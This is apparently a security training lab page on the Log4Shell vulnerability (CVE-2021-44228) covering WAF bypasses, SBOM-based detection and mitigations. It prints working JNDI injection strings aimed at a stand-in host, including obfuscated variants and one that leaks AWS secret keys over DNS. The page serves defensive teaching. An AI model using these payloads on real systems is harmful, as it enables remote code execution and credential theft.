# Lab 6.9: Case Study: Log4Shell (CVE-2021-44228)

<div class="phase-stepper">
  <a href="../" class="phase-step done">Overview</a>
  <span class="phase-arrow">›</span>
  <a href="../understand/" class="phase-step done">Understand</a>
  <span class="phase-arrow">›</span>
  <span class="phase-step current">Analyze</span>
  <span class="phase-arrow">›</span>
  <a href="../lessons/" class="phase-step upcoming">Lessons</a>
  <span class="phase-arrow">›</span>
  <a href="../detect/" class="phase-step upcoming">Detect</a>
</div>

## The Attack Mechanism and Response Chaos

**Goal:** Walk through exploitation, obfuscation bypasses, and the multi-CVE response.

### Obfuscation bypasses

The first WAF rules blocked `${jndi:`. Attackers found bypasses immediately using Log4j's own features:

```
# Case variation (Log4j is case-insensitive):
${JNDI:ldap://attacker.com/a}

# Nested lookups:
${j${::-n}di:ldap://attacker.com/a}
${${lower:j}ndi:ldap://attacker.com/a}

# Data exfiltration without RCE:
${jndi:dns://attacker.com/${env:AWS_SECRET_ACCESS_KEY}}
```

### Why SBOM would have helped

```bash
cat /app/sbom.json | python3 -c "
import json, sys
sbom = json.load(sys.stdin)
for comp in sbom.get('components', []):
    if 'log4j' in comp.get('name', '').lower():
        print(f\"  AFFECTED: {comp['group']}:{comp['name']}:{comp['version']}\")
"
```

With an SBOM, finding affected applications is a database query. Without one, organizations had to manually search every repository, run `mvn dependency:tree` on every project, and `find / -name "log4j-core-*.jar"` on every server. This took days to weeks while exploitation was ongoing.

### The mitigation options

While patching (in preference order):

1. **UPGRADE** Log4j to 2.17.1+
2. **SET** `-Dlog4j2.formatMsgNoLookups=true` (only works for 2.10.0+, does NOT fix CVE-2021-45046)
3. **REMOVE** JndiLookup class: `zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class`
4. **WAF RULES** for JNDI patterns (incomplete, bypasses found daily)

> **Checkpoint:** You should be able to trace Log4j through the dependency tree from your application to log4j-core. Run `cat /app/dependency-tree.txt` and identify the path. Also query the SBOM to confirm the vulnerable version is listed.
